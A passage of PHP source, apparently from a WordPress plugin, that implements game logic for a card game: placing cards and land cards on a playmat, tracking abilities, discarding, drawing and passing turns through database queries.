    $updates[] = $wpdb->prepare("playmat = %s",json_encode($p->playmat));
    $sql = "SELECT a.* FROM `hc_card_abilities` AS a JOIN `hc_cards` AS c ON a.card_id = c.id WHERE c.ext_id = %s";
    $sql = $wpdb->prepare($sql,$ext_id);
    action_log(__FUNCTION__ . " " . $sql);
    $abilities = $wpdb->get_results($sql);
    if ( !empty($wpdb->last_error) ) {
        action_log(__FUNCTION__ . " ERROR: " . $wpdb->last_error);
    }
    if ( $auto_abilities && !empty($abilities) ) {
        // Okay, we have an ability, so let's inject that into the abilitymat
        $needs_update = false;
        foreach ( $abilities as $a) {
            if ( has_ability($p,$a,$row,$col) ) {
                continue;
            }
            $mat_item = [];
            $mat_item['id'] = $a->id;
            $mat_item['charges'] = $a->charges;
            action_log("Adding {$a->id} to ability mat");
            if ( !is_array($p->abilitymat[$row][$col]) ) {
                $p->abilitymat[$row][$col] = [];
            }
            $abs = $p->abilitymat[$row][$col];
            $p->abilitymat[$row][$col][] = $mat_item;
            $needs_update = true;
        }
        if ( $needs_update ) {
            action_log(__FUNCTION__ . " needs update to abilitymat");
            $updates[] = $wpdb->prepare("abilitymat = %s",json_encode($p->abilitymat));
        } 
    }
    
    if ( !empty($updates) ) {
        $sql = "UPDATE `hc_players` SET " . join(',',$updates) . " WHERE id = %d"; 
        $sql = $wpdb->prepare($sql,$p->id);
        action_log(__FUNCTION__ . " $sql");
        $wpdb->query($sql);
        if ( !empty($wpdb->last_error) ) {
            action_log(__FUNCTION__ . " ERROR: " . $wpdb->last_error);
            $errors[] = $wpdb->last_error;
            $errors[] = $sql;
            return $p;
        }
    }
    return $p;
}
function get_played_land_cards_from_playmat($mat) {
    $cards = [];
    for ( $row = 0; $row < count($mat); $row++ ) {
        for ( $col = 0; $col < count($mat[$row]); $col++ ) {
            $val = (string)$mat[$row][$col];
            if ( $val !== '0' ) {
                $def = get_card_def($val);
                if ( intval($def->maintype) === CARD_LAND ) {
                    $card = new \stdClass;
                    $card->ext_id = $val;
                    $card->def = $def;
                    $card->row = $row;
                    $card->col = $col;
                    array_push($cards,$card);
                }
            }
        }
    }
    return $cards;
}
function system_play_land_card($game_id,$p,$ext_id,&$errors) {
    // All land cards have to fall in the same row, so
    // playing a land card finds the next available column
    // in the land row
    $mat = $p->playmat;
    $land_cards = get_played_land_cards_from_playmat($p->playmat);
    $row = 0;
    if ( empty($land_cards) ) {
        action_log(__FUNCTION__ . " there were no land cards found?");
        $x = new \stdClass;
        $x->ext_id = 'NONE';
        $x->row = count($mat) - 2;
        $x->col = count($mat[$x->row]) - 3; 
        $land_cards = [$x];
    } 
    // find the min column
    $min = null;
    foreach ( $land_cards as $l ) {
        if ( $min === null ) {
            $min = $l;
        }
        if ( $l->col < $min->col ) {
            $min = $l;
        }
    }
    $row = $min->row;
    $col = $min->col - 1;
    action_log(__FUNCTION__ . "$min->ext_id r=$row,c=$col");
    if ( $col === 0 ) {
        // add a new column
        action_log(__FUNCTION__ . " col is zero, expanding");
        $mat = array_map(function ($row) {
            return array_merge([0],$row); 
        },$mat); 
    }
    if ( $col < 0 ) {
        // add a new column
        action_log(__FUNCTION__ . " col < zero, expanding");
        $mat = array_map(function ($row) {
            return array_merge([0,0],$row); 
        },$mat);
    }
    action_log(__FUNCTION__ . " calling system_play_card($game_id,{$p->id},$ext_id,$row,$col)");
    return system_play_card($game_id,$p,$ext_id,$row,$col,false,true,$errors);
}
function play_card($game_id,$p,$ext_id,$row,$col,&$errors) {
    global $wpdb;
    // need to do some validation, but skipping for now
    if ( $p->current_move == $p->max_moves ) {
        $errors[] = "You have no more moves, you can attack, or click done to cede the turn";
        return $p;
    }
    $updates = [];
    if ( $p->playmat[$row][$col] !== 0 ) {
        $errors[] = "That space already has a card";
        return $p;
    }
    $def = get_card_def($ext_id);
    if ( !$def ) {
        $errors[] = "Failed to find $ext_id definition";
        return $p;
    }
    $p->playmat[$row][$col] = $ext_id;
    if ( preg_match('/EXPLORER/',type_to_name(intval($def->maintype))) ) {
        action_log("{$def->ext_id} has a type of EXPLORER, " . type_to_name(intval($def->maintype)));
        if ( $row + 1 == (count($p->playmat) - 2) ) {
            if ( $p->playmat[$row + 1][$col] === 0 ) {
                // we need to play a land card!
                action_log("$row + 1,$col is 0");
                $lc = array_shift($p->land_pile);
                $lc_def = get_card_def($lc);
                action_log("$lc has type of " . type_to_name(intval($lc_def->maintype)));
                if ( $lc ) {
                    $p->playmat[$row + 1][$col] = $lc;
                    $updates[] = $wpdb->prepare("landpile = %s",json_encode($p->land_pile));
                }
            } 
        }
    }
    $updates[] = $wpdb->prepare("playmat = %s",json_encode($p->playmat));
    if ( in_array($ext_id,array_values($p->hand)) ) {
        action_log("$ext_id is in the players hand");
        $nh = array_values(array_filter($p->hand,function ($id) use ($ext_id) { return $id != $ext_id; }));
        action_log("hand=" . join(',',$p->hand) . ", nh=" . join(',',$nh));
        $p->hand = $nh;
        $updates[] = $wpdb->prepare("hand = %s",json_encode($p->hand));
        $updates[] = "current_move = current_move + 1";
    }
    $sql = "SELECT * FROM `hc_card_abilities` AS a JOIN `hc_cards` AS c ON a.card_id = c.id WHERE c.ext_id = %s";
    $sql = $wpdb->prepare($sql,$ext_id);
    action_log($sql);
    $abilities = $wpdb->get_results($sql);
    if ( !empty($wpdb->last_error) ) {
        action_log("ERROR: " . $wpdb->last_error);
    }
    if ( !empty($abilities) ) {
        // Okay, we have an ability, so let's inject that into the abilitymat
        $needs_update = false;
        foreach ( $abilities as $a) {
            if ( has_ability($p,$a,$row,$col) ) {
                continue;
            }
            $mat_item = [];
            $mat_item['id'] = $a->id;
            
            $mat_item['charges'] = $a->charges;
            action_log("Adding {$a->id} to ability mat");
            if ( !is_array($p->abilitymat[$row][$col]) ) {
                $p->abilitymat[$row][$col] = [];
            }
            $abs = $p->abilitymat[$row][$col];
            $p->abilitymat[$row][$col][] = $mat_item;
            $needs_update = true;
        }
        if ( $needs_update ) {
            action_log("needs update to abilitymat");
            $updates[] = $wpdb->prepare("abilitymat = %s",json_encode($p->abilitymat));
        } 
    }
    
    if ( !empty($updates) ) {
        $sql = "UPDATE `hc_players` SET " . join(',',$updates) . " WHERE user_id = %d AND game_id = %d"; 
        $sql = $wpdb->prepare($sql,$p->user_id,$game_id);
        $wpdb->query($sql);
        if ( !empty($wpdb->last_error) ) {
            $errors[] = $wpdb->last_error;
            $errors[] = $sql;
            return $p;
        }
        // Now that we've updated this player, we need to set his opponents dirty so that when they
        // request a refresh, we know they need a full reload
        // we likely won't use this just yet, but soon
        $sql = "UPDATE `hc_players` as p JOIN `hc_games` as g ON g.id = p.game_id SET dirty = 1 WHERE g.id = %d and p.user_id != %d";
        $sql = $wpdb->prepare($sql,$game_id,$p->user_id);
        $wpdb->query($sql);
        if ( !empty($wpdb->last_error) ) {
            $errors[] = $wpdb->last_error;
            $errors[] = $sql;
            return $p;
        }
    }
    return $p;
}
function save_player_mats($p,&$errors) {
    global $wpdb;
    action_log(__FUNCTION__ . " saving {$p->id}");
    $sql = "UPDATE `hc_players` SET hand = %s, discardpile = %s, drawpile = %s, landpile = %s, playmat = %s, abilitymat = %s, damagemat = %s WHERE id = %d";
    $sql = $wpdb->prepare(
        $sql, 
        json_encode($p->hand),
        json_encode($p->discard_pile),
        json_encode($p->draw_pile),
        json_encode($p->land_pile),
        json_encode($p->playmat), 
        json_encode($p->abilitymat),
        json_encode($p->damagemat),
        $p->id
    );
    action_log(__FUNCTION__ . " " . $sql);
    $wpdb->query($sql);
    action_log(__FUNCTION__ . " affected=" . $wpdb->get_var("SELECT ROW_COUNT();"));
    if ( !empty($wpdb->last_error) ) {
        action_log(__FUNCTION__ . " " . $wpdb->last_error);
        $errors[] = "Failed to force discard";
        return $p;
    }
    $sql = $wpdb->prepare(
        "SELECT hand FROM `hc_players` WHERE id = %d",
        $p->id 
    );
    action_log(__FUNCTION__ . " $sql returns " . json_encode($wpdb->get_results($sql)));
    return $p;
}
function can_cede_turn($game_id,$pid,$uid) {
    global $wpdb;
    action_log(__FUNCTION__ . " gid=$game_id,pid=$pid,uid=$uid");
    if ( is_over($game_id) ) {
        action_log(__FUNCTION__ . " can't cede a turn for a finished game");
        return false;
    }
    $sql = "SELECT 1 FROM `hc_players` as p JOIN `hc_games` as g ON p.game_id = g.id WHERE p.id = %d and g.id = %d AND p.user_id = %d AND g.current_player_id = %d";
    $sql = $wpdb->prepare($sql,$pid,$game_id,$uid,$pid);
    action_log(__FUNCTION__ . " sql=$sql");
    if ( $wpdb->get_var($sql) ) {
        return true;
    }
    action_log(__FUNCTION__ . " got to end, so false");
    return false;
}
function get_card_name($ext_id) {
    global $wpdb;
    $sql = "SELECT name FROM `hc_cards` WHERE ext_id = %s";
    $sql = $wpdb->prepare($sql,$ext_id);
    return $wpdb->get_var($sql);
}
function next_player($game_id,&$errors) {
    global $wpdb;
    $players = get_players($game_id,[],$errors);
    if ( empty($players) ) {
        $errors[] = "There were no players for $game_id";
        return;
    }
    $current_player_id = $wpdb->get_var($wpdb->prepare("SELECT current_player_id FROM `hc_games` WHERE id = %d",$game_id));
    if ( !$current_player_id ) {
        $errors[] = "Failed to select current_player_id";
        return;
    }
    $ni = null;
    for ( $i = 0; $i < count($players); $i++ ) {
        $p = $players[$i];
        if ( $p->id == $current_player_id ) {
            $ni = $i + 1;
            break;
        }
    }
    if ( ! $ni ) {
        $errors[] = "Failed to find player?";
        return;
    }
    if ( $ni > count($players) - 1 ) {
        // a full round has happened
        $ni = 0;
        $sql = "UPDATE `hc_games` SET round = round + 1 WHERE id = %d";
        $sql = $wpdb->prepare($sql,$game_id);
        $wpdb->query($sql); 
        if ( !empty($wpdb->last_error) ) {
            $errors[] = $sql;
            $errors[] = $wpdb->last_error;
        }
    }
    $new_player = $players[$ni];
    $sql = "UPDATE `hc_games` SET current_player_id = %d WHERE id = %d";
    $sql = $wpdb->prepare($sql,$new_player->id,$game_id);
    $wpdb->query($sql); 
    if ( !empty($wpdb->last_error) ) {
        $errors[] = $sql;
        $errors[] = $wpdb->last_error;
    }
    // Need to see that new_player has a full hand
    $needs_update = false;
    $cap = 5;
    $s = 0;
    while ( count($new_player->hand) < 5 ) {
        $s++;
        $needs_update = true;
        $new_player->hand[] = array_shift($new_player->draw_pile);
        if ( $s > $cap ) {
            action_log("While trying to draw in " . __FUNCTION__ . ", cap was reached");
            break;
        }
    }
    if ( $needs_update ) {
        $sql = "UPDATE `hc_players` SET hand = %s, drawpile = %s WHERE id = %d";
        $sql = $wpdb->prepare($sql,json_encode($new_player->hand), json_encode($new_player->draw_pile), $new_player->id);
        $wpdb->query($sql);
        if ( !empty($wpdb->last_error) ) {
            $errors[] = $sql;
            $errors[] = $wpdb->last_error;
        }
    }
    $sql = "UPDATE `hc_players` as p SET p.current_move = 0,p.attacks = p.max_attacks WHERE p.game_id = %d";
    $sql = $wpdb->prepare($sql,$game_id);
    $wpdb->query($sql); 
    if ( !empty($wpdb->last_error) ) {
        $errors[] = $sql;
        $errors[] = $wpdb->last_error;
    }
}
function check_player_has_cards($id) {
    global $wpdb;
    $res = $wpdb->get_results(
            $wpdb->prepare("SELECT 1 FROM `hc_player_cards` WHERE player_id = %d",$id));
    return !empty($res);
}
function _get_games($id) {
    global $wpdb;
    $sql = "SELECT * FROM `hc_games` as games WHERE games.created_by = %d AND (games.declined != 1 OR games.declined IS NULL)"; 
    $sql = $wpdb->prepare($sql,$id);
    $my_games = $wpdb->get_results($sql); 
    if ( empty($my_games) ) {
        $my_games = [];
    }
    foreach ( $my_games as &$mg ) {
        $mg->players = $wpdb->get_results("SELECT * FROM `hc_players` WHERE game_id = {$mg->id}");
    }
    $sql = "SELECT games.* FROM `hc_games` as games JOIN `hc_players` as p ON p.game_id = games.id WHERE (games.declined != 1 OR games.declined IS NULL) AND p.user_id = %d AND games.created_by != %d"; 
    $sql = $wpdb->prepare($sql,$id,$id);
    $others_games = $wpdb->get_results($sql); 
    if ( empty($others_games) ) {
        $others_games = [];
    }
    foreach ( $others_games as &$mg ) {
        $mg->players = $wpdb->get_results("SELECT * FROM `hc_players` WHERE game_id = {$mg->id}");
    }
    return [$my_games,$others_games];
}
function discard($game_id,$player_id,$uid,$ext_id,$row,$col,$hint,&$errors) {
    $players = get_players($game_id,[$player_id],$errors);
    if ( !empty($errors) || empty($players) ) {
        action_log(__FUNCTION__ . " failed to get players");
        return;
    } 
    
    $p = $players[0];
    if ( (string)$p->user_id !== (string)$uid ) {
        action_log(__FUNCTION__ . " user_id is wrong, no perms");
        $errors[] = MSG_YOU_CANT_DO_THAT;
        return;
    } 
    //if ( $p->current_move + 1 > $p->max_moves ) {
    //    $errors[] = get_out_of_moves_message($p);
    //    return;
    //}
    if ( $hint === 'discard_from_playmat' ) {
        if ( $p->playmat[$row][$col] === $ext_id ) {
            array_push($p->discard_pile,$p->playmat[$row][$col]);
            $p->playmat[$row][$col] = 0;
            save_player_mats($p,$errors);
        } 
    }
    if ( $hint === 'discard_from_hand' ) {
        $nh = [];
        foreach ( $p->hand as $id ) {
            if ( $id === $ext_id ) {
                array_push($p->discard_pile,$ext_id);
                continue;
            }
            $nh[] = $id;
        }
        $p->hand = $nh;
        action_log(__FUNCTION__ . " nh=" . join(',',$p->hand));
        save_player_mats($p,$errors);
    }
    //$sql = "UPDATE `hc_players` SET current_move = current_move + 1 WHERE id = %d";
    //$sql = $wpdb->prepare($sql,$p->id);
    //$wpdb->query($sql);
    //if ( !empty($wpdb->last_error) ) {
    //    $errors[] = $wpdb->last_error;
    //}
}
function system_discard($p,$ext_id) {
    $mat = $p->playmat;
    $dpile = $p->discard_pile;
    $needs_update = false;
    for ( $row = 0; $row < count($mat); $row++) {
        for ( $col = 0; $col < count($mat[$row]); $col++) {
            if ( $mat[$row][$col] === $ext_id ) {
                array_push($dpile,$ext_id);
                $mat[$row][$col] = 0; 
                $p->abilitymat[$row][$col] = 0;
                $p->playmat = $mat;
                $p->discard_pile = $dpile;
                $needs_update = false;
            } 
        }
    }
    return $p;
}
function is_active_area_card($def) {
    return (
        (preg_match('/EVENT/',type_to_name($def->maintype))) || 
        (preg_match('/DOCUMENT/',type_to_name($def->maintype))) || 
        (preg_match('/RELIC/',type_to_name($def->maintype))) || 
        (preg_match('/KNOWLEDGE/',type_to_name($def->maintype))) || 
        (preg_match('/TECHNOLOGY/',type_to_name($def->maintype))) 
    );
}
function get_row_col_for($p,$id) {
    $mat = $p->playmat;
    action_log(__FUNCTION__ . ", mat=" . json_encode($mat));
    for ( $row = 0; $row < count($mat); $row++) {
        for ( $col = 0; $col < count($mat[$row]); $col++ ) {
            action_log(__FUNCTION__ . " id=$id, {$mat[$row][$col]}");
            if ( $mat[$row][$col] === $id ) {
                $r = new \stdClass;
                $r->row = $row;
                $r->col = $col;
                action_log("Returning " . json_encode($r));
                return $r;
            }
        }
    }
    return null;
}
function get_out_of_moves_message($p) {
    return "You are out of moves, you have made {$p->current_move} moves, and can only make {$p->max_moves}. Click Done to cede your turn, or launch up to {$p->max_attacks} attacks before ceding.";
}
function draw_card($game_id,$player_id,$uid,&$errors) {
    global $wpdb; 
    action_log(__FUNCTION__ . " gid=$game_id,pid=$player_id");
    $sql = "SELECT g.* FROM `hc_games` as g JOIN `hc_players` as p ON g.id = p.game_id WHERE g.id = %d AND p.id = %d AND p.user_id = %d";
    $sql = $wpdb->prepare($sql,$game_id,$player_id,$uid); 
    action_log(__FUNCTION__ . " sql=$sql");
    $game = $wpdb->get_row($sql);
    if ( !empty($wpdb->last_error) ) {
        $errors[] = $sql;
        $errors[] = $wpdb->last_error;
        return;
    }
    if ( ! $game ) {
       $errors[] = MSG_GAME_NOT_FOUND;
       return;
    }
    // so we have the game, let's get the player
    action_log(__FUNCTION__ . " hand=" . $wpdb->get_var($wpdb->prepare("SELECT hand FROM hc_players WHERE id = %d",$player_id)));
    $players = get_players($game->id,[$player_id],$result['errors']);
    if ( empty($players) ) {
        $errors[] = "No players found";
        return;
    }
    $p = $players[0];
    if ( $p->current_move + 1 > $p->max_moves ) {
        $errors[] = get_out_of_moves_message($p); 
        return;
    }
    action_log(__FUNCTION__ . " p->hand=" . join(',',$p->hand));
    if ( count($p->hand) > 4 ) {
        $errors[] = "You can't have more than 5 cards in a hand.";
        return;
    }
    $card = array_shift($p->draw_pile);
    action_log("Drew $card");
    $p->hand[] = $card;
    action_log("hand=" . join(',',$p->hand));
    $sql = "UPDATE `hc_players` SET hand = %s, drawpile = %s, current_move = current_move + 1 WHERE id = %d";
    $sql = $wpdb->prepare($sql,json_encode($p->hand),json_encode($p->draw_pile),$p->id);
    $wpdb->query($sql);
    if ( ! empty($wpdb->last_error) ) {
        $errors[] = $sql;
        $errors[] = $wpdb->last_error;
        return;
    }
}
function get_player_decks($id) {
    global $wpdb;
    $sql = $wpdb->prepare("
        SELECT * FROM `hc_player_decks` WHERE player_id = %d
    ",$id);
    $decks = $wpdb->get_results($sql,ARRAY_A);
    if ( empty($decks) ) {
        $decks = [];
    }
    return $decks;
}
function owns_deck($uid,$did) {
    global $wpdb;
    $sql = "SELECT 1 FROM `hc_player_decks` WHERE player_id = %d AND id = %d";
    $sql = $wpdb->prepare($sql,$uid,$did);
    action_log($sql);
    if ( empty($wpdb->get_results($sql)) )
        return false;
    return true;
}
function user_id_exists($uid) {
    global $wpdb;
    $count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM {$wpdb->users} WHERE ID = %d", $uid));
    if ((int)$count > 0)
        return true;
    return false;
}
function ascii_playmat($mat) {
    $mat = array_map(function ($row) {
        return join("\t",$row); 
    },$mat);
    return join("\n",$mat);
}
function ascii_abilitymat($mat) {
    for ( $row = 0; $row < count($mat); $row++) {
        for ( $col = 0; $col < count($mat[$row]); $col++ ) {
            $abs = $mat[$row][$col];
            if ( is_array($abs) ) {
                $abs = array_map(function ($a) { return $a['id']; },$abs);
            } else {
                $abs = [0];
            }
            $mat[$row][$col] = join(',',$abs);
        }
    }
    $mat = array_map(function ($row) {
        return join("\t",$row); 
    },$mat);
    return join("\n",$mat);
}
function ability_table($p) {
    $mat = $p->abilitymat;
    $abilities = [];
    for ( $row=0; $row<count($mat);$row++) {
        for ( $col=0; $col<count($mat[$row]); $col++ ) {
            $abs = $mat[$row][$col];
            if ( is_array($abs) ) {
                foreach ( $abs as $ab ) {
                    $abilities[] = mat_item_to_ability($ab);
                }
            }
        } 
    }
    ob_start();
    echo "Abilities (" . count($abilities) . ")" . PHP_EOL;
    echo "---------------------------------------------------------------------" . PHP_EOL;
    foreach ($abilities as $ability) {
        echo join(
            "\t",
            [
                $ability->id,
                $ability->card_id,
                $ability->affects_attribute, 
                $ability->affect_amount, 
                type_to_name($ability->apply_to_type),
                type_to_name($ability->apply_to_scope),
                type_to_name($ability->ability_type),
                $ability->description, 
            ]
        ) . PHP_EOL;
    }
    echo "---------------------------------------------------------------------" . PHP_EOL;
    $contents = ob_get_contents();
    ob_end_clean();
    return $contents;
}
function get_played_cards_from_player($p) {
    $cards = [];
    $mat = $p->playmat;
    for ( $row = 0; $row < count($mat); $row++ ) {
        for ( $col = 0; $col < count($mat[$row]); $col++ ) {
            $ext_id = $mat[$row][$col];
            if ( empty(trim($ext_id) ) )
                continue;
            $c = new \stdClass;
            $c->ext_id = $ext_id;
            $c->def = get_card_def($ext_id);
            $c->row = $row;
            $c->col = $col;
            $cards[] = $c;
        }
    }
    return $cards;
}
function card_table($p) {
    $cards = get_played_cards_from_player($p);
    ob_start();
    echo "Cards (" . count($cards) . ")" . PHP_EOL;
    echo "---------------------------------------------------------------------" . PHP_EOL;
    foreach ($cards as $card) {
        echo join(
            "\t", 
            [
                $card->ext_id,
                $card->def->id,
                intval(is_active_area_card($card->def)),
                $card->def->strength,
                "{$card->row},{$card->col}",
                type_to_name($card->def->maintype),
                $card->def->name
            ]
        ) . PHP_EOL;
    } 
    echo "---------------------------------------------------------------------" . PHP_EOL;
    $content = ob_get_contents();
    ob_end_clean();
    return $content;
}
function is_over($game_id) {
    global $wpdb;
    action_log(__FUNCTION__ . " gid=$game_id");
    $winner_id = $wpdb->get_var($wpdb->prepare("SELECT winner_id FROM `hc_games` WHERE id = %d",$game_id));
    if ( (string)$winner_id !== '0' ) {
        return true;
    }
    return false;
}
